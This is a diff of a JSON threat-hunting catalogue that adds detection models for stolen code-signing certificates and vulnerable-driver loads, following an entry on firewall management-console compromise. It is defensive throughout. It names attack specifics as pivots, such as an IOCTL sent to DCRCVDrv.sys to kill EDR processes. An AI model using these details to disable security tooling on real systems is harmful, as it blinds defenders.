+    "why": "- **Compromising the management plane compromises everything it manages.** An FMC holds credentials for, and configuration of, every firewall in its scope. Talos observed exactly that being harvested. This is not one appliance's worth of exposure — it is the security control plane, which makes the blast radius categorically different from an ordinary server compromise and justifies hunting it specifically rather than as part of a general server sweep.\n- **Appliances have a narrow, vendor-defined normal, which makes weak-looking conditions strong.** On a general-purpose server, \"an unexpected file in the webroot\" or \"an outbound connection\" would be hopeless signals. On an FMC the legitimate webroot inventory is fixed between upgrades and the set of destinations the appliance should ever contact is short and enumerable, so a diff and a destination allowlist do work here that would be impractical anywhere else.\n- **Living off the appliance's own tooling defeats binary-centric detection entirely.** There is no malicious executable to catch in the root-execution step — `package_info.pl` is Cisco's, it is signed, and it is doing its documented job. Detection has to key on the pairing of a legitimate utility with an illegitimate target, which is a genuinely different query shape from the one most detection content is built around.\n- **Three independent clusters reached for the same primitive, so it will outlast this campaign.** When separate actors converge on one technique, that technique is a property of the platform rather than of a toolkit, and a detection built on it keeps paying after the current IOCs are dead. The port list they tunnelled — 389, 636, 88, 445, 135, 5985 — also tells you where they were going next, which is where the follow-on hunt belongs.",
+    "references": "- [MITRE ATT&CK T1505.003 — Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)\n- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)\n- [MITRE ATT&CK T1059.004 — Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/)\n- [MITRE ATT&CK T1552 — Unsecured Credentials](https://attack.mitre.org/techniques/T1552/)\n- [MITRE ATT&CK T1602 — Data from Configuration Repository](https://attack.mitre.org/techniques/T1602/)\n- [Active exploitation of Cisco Secure Firewall Management Center vulnerabilities (Cisco Talos)](https://blog.talosintelligence.com/fmc-ongoing-exploitation/)\n- [CISA Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n- [Cisco Security Advisories — Secure Firewall Management Center](https://sec.cloudapps.cisco.com/security/center/publicationListing.x)",
+    "file_path": "Flames/H317.md",
+    "created": null
+  },
+  {
     "id": "M001",
     "category": "Alchemy",
     "title": "A machine learning model can detect anomalies in user login patterns that indicate compromised accounts.",
@@ -12982,5 +13477,95 @@
     "references": "- [Remote Access Tools (T1219) — MITRE ATT&CK](https://attack.mitre.org/techniques/T1219/)\n- [Lateral Tool Transfer (T1570) — MITRE ATT&CK](https://attack.mitre.org/techniques/T1570/)\n- [Rogue ScreenConnect Installations Across Unrelated Hosts Suggest Worm-Like Activity — Huntress](https://www.huntress.com/blog/rogue-screenconnect-installations)\n- [First Time Seen Remote Monitoring and Management Tool — Elastic prebuilt detection rule (the per-host new-terms approach this model extends across hosts)](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/command_and_control_new_terms_commonly_abused_rmm/)\n- [RMM Tools Under Attack: Exploring More Effective Detections — Immersive Labs](https://www.immersivelabs.com/resources/c7-blog/rmm-tools-under-attack-exploring-more-effective-detections)\n- [CISA Eviction Strategies — Remote Access Software (T1219)](https://www.cisa.gov/eviction-strategies-tool/info-attack/T1219)\n- [Software Deployment Tools (T1072) — MITRE ATT&CK (the adjacent trust-abuse path scoped in H307)](https://attack.mitre.org/techniques/T1072/)",
     "file_path": "Alchemy/M043.md",
     "created": "2026-09-21T10:51:30-05:00"
+  },
+  {
+    "id": "M044",
+    "category": "Alchemy",
+    "title": "Scoring code-signing identities by fleet rarity and signer-to-purpose mismatch to surface stolen certificates",
+    "tactic": "Defense Evasion, Execution",
+    "notes": "Model shape - a per-execution score over four weighted inputs, surfaced as a ranked list rather than as alerts. (1) SIGNER RARITY - the number of distinct hosts in the fleet that have executed anything signed by this publisher over 90 days, scored inversely. (2) SIGNER NOVELTY - days since this publisher was first seen anywhere in the fleet, with a sharp weight inside the first 7 days. (3) SIGNER-TO-PURPOSE MISMATCH - whether the binary's install path, filename, and observed behaviour are consistent with the signer's actual product line; concretely, score a mismatch when a hardware-vendor signer runs from a user-writable path, when the signer's brand does not appear in the file's `Company`/`Product` resources, or when the host's hardware vendor does not match an OEM signer. (4) SIGNATURE STATE - valid, expired, revoked, or valid-but-countersigned-after-certificate-compromise, with revoked and expired scoring heavily. Multiply the result by a role weight from the asset inventory so that engineering hosts, which legitimately produce signing diversity, do not dominate.\nReported basis from the source intel - the Google Doc campaign used THREE separate stolen code-signing certificates in one chain: one belonging to a Norwegian company (used on the fake \"Google API Connector\" ClickOnce application), one belonging to Lenovo (used on the TLS interception proxy disguised as a driver package, see [[H314]]), and one belonging to Discord Inc. (used on a fake DocSend desktop installer, where signature validation actually FAILED). That last case is instructive for tuning - a recognisable corporate signer name with a failing validation is both very high-signal and easy to miss if telemetry stores only a signed/unsigned boolean.\nThe mismatch dimension is where most of the precision lives - rarity alone is noisy because legitimate niche software is rare too. Mismatch is much harder for an adversary to avoid, because they must choose between signing with a certificate whose owner plausibly ships software like theirs (a small pool, and one that often does not match the behaviour they need) or accepting an obvious inconsistency. Concretely useful mismatch features - an OEM or hardware-vendor signer on a binary outside `%PROGRAMFILES%`; a signer whose brand is absent from the binary's own version resources; a signer whose products are not otherwise present on the host; and a signer appearing on a host population that does not correspond to any inventoried software deployment.\nCorrelating conditions that promote a ranked entry to an incident - the signed binary writes to `~/Library/LaunchAgents`, `HKLM\\...\\Run`, the root certificate store, or a service registration; the signed binary is a kernel driver (hand that case to [[M045]], which models driver loads specifically); the signed binary hollows or injects into another process; or the signer appears on fewer hosts than the number of security incidents it is associated with.\nOutput shape and triage - a ranked list carrying, per entry: signer common name, certificate thumbprint and serial, validity dates, signature status, fleet host count, signer first-seen date, the binary's path and hashes, its version resources, and the mismatch features that fired. The fastest triage step is checking whether the signer ships any product the organisation actually licenses or has installed; a signer with no inventory presence and no procurement record is the shape being hunted.\nDeliverable that outlasts the hunt - a SIGNER REGISTER: every code-signing identity observed executing in the estate, its expected host population, and a disposition. Once that register exists, a new signer becomes a one-line diff, which is the same property that makes [[B048]] work for certificate trust.\nWhy this is Alchemy rather than Flames - the binary is genuinely, verifiably signed, so there is no signature, hash, path or command line that generalises; a rule would either fire on all rare software or on none. The discriminating signal exists only as a relative measure of how a signing identity is distributed across a particular fleet compared with every other signing identity in it, which requires a per-environment model.\n",
+    "tags": [
+      "alchemy",
+      "defense_evasion",
+      "execution",
+      "t1553_002",
+      "t1036_005",
+      "t1204_002",
+      "code_signing",
+      "stolen_certificate",
+      "authenticode",
+      "signer_rarity",
+      "rarity_scoring",
+      "supply_chain_trust",
+      "windows",
+      "T1553.002",
+      "T1036.005",
+      "T1204.002"
+    ],
+    "techniques": [
+      "T1553.002",
+      "T1036.005",
+      "T1204.002"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [
+      "H314",
+      "M045"
+    ],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **A stolen certificate inverts the control rather than evading it.** This is not a gap in signature checking; it is signature checking working correctly on a fraudulent input. Any detection strategy that consumes the signed/unsigned boolean will confirm the malware, which means the boolean has to be replaced by something the adversary does not control — and distribution across a fleet is exactly that.\n- **Most telemetry pipelines discard the field the model needs.** Endpoint logging very commonly reduces Authenticode to a boolean and drops the publisher name, thumbprint and validity dates. Building this model forces those fields into retention, and that change pays off across unrelated investigations — the Discord-signed installer whose validation actually *failed* is invisible to a boolean and obvious with the signer name in hand.\n- **Mismatch is the feature an adversary cannot cheaply satisfy.** Certificate theft is opportunistic: operators sign with whatever they obtained, not with a certificate whose owner plausibly ships the kind of software they are deploying. That forces a visible inconsistency between signer and artefact — a hardware vendor signing a TLS proxy, a chat company signing a document-sharing installer — and inconsistency is far more robust than rarity, which legitimate niche software also exhibits.\n- **It composes with the other trust-surface work rather than duplicating it.** [[B048]] registers which certificate authorities a machine trusts, [[M045]] ranks kernel driver loads where signing is also the abused control, and this model registers which signing identities actually execute. Together they answer the three different questions that \"is it signed?\" collapses into one, and each produces a durable register rather than a stream of alerts.",
+    "references": "- [MITRE ATT&CK T1553.002 — Subvert Trust Controls: Code Signing](https://attack.mitre.org/techniques/T1553/002/)\n- [MITRE ATT&CK T1036.005 — Masquerading: Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005/)\n- [MITRE ATT&CK T1204.002 — User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)\n- [Google Doc Sidebar Sends Mac and Windows Users Down Different Paths to Malware (Huntress)](https://www.huntress.com/blog/google-doc-sidebar-malware-mac-windows)\n- [Microsoft — Authenticode signature verification and trusted publisher behaviour](https://learn.microsoft.com/en-us/windows/win32/seccrypto/cryptography-tools)\n- [Elastic prebuilt detection rules — defense-evasion and code-signing coverage](https://www.elastic.co/guide/en/security/current/prebuilt-rules.html)\n- [Detection.FYI — searchable Sigma rule corpus for signature and masquerading detection content](https://detection.fyi/)",
+    "file_path": "Alchemy/M044.md",
+    "created": null
+  },
+  {
+    "id": "M045",
+    "category": "Alchemy",
+    "title": "Ranking kernel driver loads by fleet prevalence and signing age to surface bring-your-own-vulnerable-driver",
+    "tactic": "Defense Evasion, Privilege Escalation",
+    "notes": "Model shape - a per-driver-load score combining four weighted inputs, surfaced as a ranked daily list. (1) FLEET PREVALENCE - the number of distinct hosts that have loaded this driver hash over 90 days, scored inversely; a hash on one host out of forty thousand is the top of the list. (2) PATH LEGITIMACY - whether `ImageLoaded` resolves inside `%SystemRoot%\\System32\\drivers\\` or somewhere else; `%TEMP%`, `%APPDATA%`, `%PROGRAMDATA%` and user-profile paths score heavily. (3) SIGNING-CERTIFICATE AGE - the gap between the signing certificate''s validity period and now, contributing a modest weight. (4) LOAD PERSISTENCE - whether the driver loads at every boot (legitimate installed software) or appeared exactly once (the BYOVD profile). Add a decisive multiplier for any hash matching the LOLDrivers reference set, and a second for any CodeIntegrity block event on the same host.\nReported artefact from the source chain - the ClearFake/Amatera chain terminated EDR processes by identifying them via name HASHING and then sending IOCTL `0x2205c0` to a vulnerable driver, `DCRCVDrv.sys`, which invoked `ZwTerminateProcess` from kernel mode. Retain the driver name and IOCTL as pivots, but do not build the detection on them - the whole point of BYOVD is that the specific driver is interchangeable, and there are hundreds of candidates.\nCorrelating signal that raises a hit to an incident - a rare driver load followed within minutes by security-tooling processes terminating unexpectedly, by an EDR agent going silent, or by a gap in expected telemetry from that host. Because the kill happens from kernel mode, the endpoint agent may produce no record of its own death, so hunt for the SILENCE - a host that stops reporting while remaining reachable on the network is the strongest possible corroboration and is often the only evidence the agent could ever have produced.\nCompanion query worth running alongside - Sysmon Event ID 11 for `.sys` files created anywhere outside `%SystemRoot%\\System32\\drivers\\`, and System event 7045 registering a kernel-mode service whose `ImagePath` points to such a location. A driver written to `%TEMP%` and registered as a service is close to self-evidently worth reviewing regardless of what the prevalence model says, and gives a cheap standing detection while the model is being tuned.\nPreventive control to check as an output of this hunt - Microsoft''s vulnerable driver blocklist (enabled by default with HVCI/Memory Integrity, and separately configurable) blocks a curated set of known-abusable drivers. Report, as a deliverable of this hunt, what proportion of the estate has HVCI and the blocklist enabled - that number is usually much lower than assumed, and raising it removes a large share of the BYOVD candidate space outright.\nOutput shape and triage - a ranked daily list with, per entry: driver hash, `ImageLoaded` path, signer name, certificate validity dates, host count over 90 days, first-seen timestamp, loading process, whether the hash is in LOLDrivers, and whether any CodeIntegrity or EDR-silence event followed on the same host. Disposition each recurring benign entry once into an allowlist keyed on hash plus expected host population, so the list shortens over time rather than repeating.\nWhy this is Alchemy rather than Flames - the malicious driver is validly signed and loaded through a documented mechanism, so there is no signature, path or command line that generalises. Known-bad lists catch only what has already been enumerated, and BYOVD specifically selects around them. The only durable discriminator is how the driver''s deployment population compares to that of legitimate drivers in the same fleet, which is a relative, per-environment measure.\n",
+    "tags": [
+      "alchemy",
+      "defense_evasion",
+      "privilege_escalation",
+      "t1685",
+      "t1543_003",
+      "t1068",
+      "t1553_002",
+      "byovd",
+      "vulnerable_driver",
+      "edr_evasion",
+      "kernel",
+      "rarity_scoring",
+      "clearfake",
+      "windows",
+      "T1685",
+      "T1543.003",
+      "T1068",
+      "T1553.002"
+    ],
+    "techniques": [
+      "T1685",
+      "T1543.003",
+      "T1068",
+      "T1553.002"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [
+      "H313"
+    ],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **This technique is specifically designed to survive every static check, so a relative model is not a stylistic preference but the only option.** Signed, documented load mechanism, legitimate IOCTL, valid vendor — each individual property is indistinguishable from legitimate software, and each is verified as good by the controls examining it. Only the comparison against how drivers normally arrive in *this* fleet separates them.\n- **Blocklists are structurally one step behind and the adversary chooses accordingly.** The Microsoft vulnerable driver blocklist and LOLDrivers are valuable and should be used as strong weights, but they enumerate what is already known while the abusable population is large and growing. Prevalence scoring catches the driver nobody has catalogued yet, which is precisely the one an actor will select.\n- **Deployment population is a discriminator the adversary cannot easily fake.** To make a BYOVD driver look legitimate by this measure, an actor would need it present across a large, coherent, management-channel-defined slice of the estate — which is the very thing a targeted intrusion cannot arrange. That gives the model a durable edge rather than a temporary one.\n- **The consequence of a successful load is telemetry loss, so the corroborating signal is an absence.** When the driver kills the EDR agent from kernel mode, the agent may never record its own termination. Pairing rare driver loads with hosts that go quiet while remaining network-reachable catches the outcome even when the endpoint product could not report it — and that pairing is only possible if someone is explicitly watching for silence.\n- **Running it produces a control-coverage number the organisation probably does not have.** HVCI/Memory Integrity and the driver blocklist remove much of the BYOVD candidate space, and their real deployment rate across an estate is almost always lower than assumed. Measuring that coverage is a concrete, durable output of the hunt independent of whether any malicious driver is found.",
+    "references": "- [MITRE ATT&CK T1685 — Disable or Modify Tools](https://attack.mitre.org/techniques/T1685/)\n- [MITRE ATT&CK T1543.003 — Create or Modify System Process: Windows Service](https://attack.mitre.org/techniques/T1543/003/)\n- [MITRE ATT&CK T1068 — Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)\n- [ClearFake WebDAV infection chain delivers Amatera stealer (Cisco Talos)](https://blog.talosintelligence.com/clearfake-webdav-infection-chain/)\n- [LOLDrivers — living-off-the-land known vulnerable driver reference set](https://www.loldrivers.io/)\n- [Microsoft — recommended driver block rules and HVCI](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules)\n- [Atomic Red Team — T1068 Exploitation for Privilege Escalation atomics](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1068/T1068.md)",
+    "file_path": "Alchemy/M045.md",
+    "created": null
   }
 ]
